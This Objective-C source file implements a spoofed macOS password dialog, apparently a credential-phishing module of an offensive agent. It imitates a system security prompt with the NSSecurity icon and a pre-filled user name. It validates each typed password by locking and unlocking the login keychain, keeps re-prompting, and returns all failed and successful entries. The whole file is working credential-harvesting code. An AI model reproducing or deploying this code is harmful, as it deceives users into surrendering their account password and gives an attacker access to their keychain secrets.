#import <Security/Security.h>
#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#import "prompt_darwin.h"
@interface Prompt : NSObject

@property (strong, nonatomic) void (^successHandler)(NSString *);
@property (strong, nonatomic) void (^failureHandler)(NSModalResponse , NSString*);

- (void)runWithMessageText:(NSString *)messageText informativeText:(NSString *)informativeText icon:(NSString*)icon;

@end

@implementation Prompt

- (id)init {
    self = [super init];
    return self;
}

- (void)setupTextField:(NSTextField *)textField {
    textField.backgroundColor = [NSColor clearColor];
    textField.bezeled = YES;
    textField.bezelStyle = NSTextFieldRoundedBezel;
    textField.cell.usesSingleLineMode = YES;
    textField.font = [NSFont systemFontOfSize:NSFont.smallSystemFontSize];
    textField.layer.cornerRadius = 1.5;
}

- (void)runWithMessageText:(NSString *)messageText informativeText:(NSString *)informativeText icon:(NSString*) icon {
    if (!_successHandler) _successHandler = ^(NSString *_) { exit(EXIT_SUCCESS); };
    if (!_failureHandler) _failureHandler = ^(NSModalResponse _, NSString *){ exit(EXIT_FAILURE); };

    NSTextField *usernameField = [[NSTextField alloc] initWithFrame:NSMakeRect(0, 31.0, 230.0, 24.0)];
    [self setupTextField:usernameField];
    usernameField.placeholderString = @"Username";
    usernameField.stringValue = NSFullUserName();
    usernameField.editable = NO;

    NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0.0, 0.0, 230.0, 24.0)];
    [self setupTextField:passwordField];
    passwordField.placeholderString = @"Password";

    NSView *accessoryView = [[NSView alloc] initWithFrame:NSMakeRect(0, 0, 230.0, 64.0)];
    [accessoryView addSubview:usernameField];
    [accessoryView addSubview:passwordField];

    NSAlert *alertView = [NSAlert alertWithMessageText:messageText
                                         defaultButton:@"OK"
                                       alternateButton:@"Cancel"
                                           otherButton:0
                             informativeTextWithFormat:@"%@", informativeText];

    alertView.accessoryView = accessoryView;
    alertView.icon = [[NSImage alloc] initByReferencingFile:[[NSString alloc] initWithString:icon]];
    if(alertView.icon == NULL || [icon length] == 0){
        alertView.icon = [NSImage imageNamed:@"NSSecurity"];
    }
    alertView.window.level = NSModalPanelWindowLevel;
    alertView.window.initialFirstResponder = passwordField;

    NSModalResponse response = [alertView runModal];
    if (response == NSModalResponseOK && [self verifyPassword:passwordField.stringValue]) {
        self.successHandler(passwordField.stringValue);
    }else {
        self.failureHandler(response, passwordField.stringValue);
    }

}

- (BOOL)verifyPassword:(NSString *)password {
    const char *passwd = [password cStringUsingEncoding:NSUTF8StringEncoding];
    unsigned long length = strlen(passwd);
    SecKeychainLock(nil);
    OSStatus status = SecKeychainUnlock(nil, length & 0xffffffff, passwd, true);
    return status == ERR_SUCCESS;
}

@end

const char* prompt(char* icon, char* title, char* message, int maxTries){
    Prompt *agent = [[Prompt alloc] init];
    __block NSString* userText = NULL;
    __block NSMutableString* failedText = [[NSMutableString alloc] init];
    __block bool reprompt = false;
    __block int currentTry = 1;
    agent.successHandler = ^(NSString *password) {
        reprompt = false;
        userText = [[NSString alloc] initWithString:password];
    };

    agent.failureHandler = ^(NSModalResponse resp, NSString* password){
        reprompt = true;
        [failedText appendFormat:@"%@\n", password];
    };

    NSApplication *myapp = [NSApplication sharedApplication];
    [myapp setActivationPolicy:NSApplicationActivationPolicyAccessory];
    [myapp activateIgnoringOtherApps:YES];

    [agent runWithMessageText:[[NSString alloc] initWithUTF8String:title]
              informativeText:[[NSString alloc] initWithUTF8String:message]
              icon:[[NSString alloc] initWithUTF8String:icon]];
    while(userText == NULL){
        [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1f]];
        if(maxTries < 0 || currentTry < maxTries){
            currentTry += 1;
        } else {
            userText = @"(null)";
            reprompt = false;
        }
        if(reprompt){
            reprompt = false;
            [agent runWithMessageText:[[NSString alloc] initWithUTF8String:title]
                      informativeText:[[NSString alloc] initWithUTF8String:message]
                      icon:[[NSString alloc] initWithUTF8String:icon]];
        }

    }
    [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1f]];
    return [[[NSString alloc] initWithFormat:@"Failed Inputs:\n%@\nSuccessful Input:%@\n", failedText, userText] UTF8String];
}
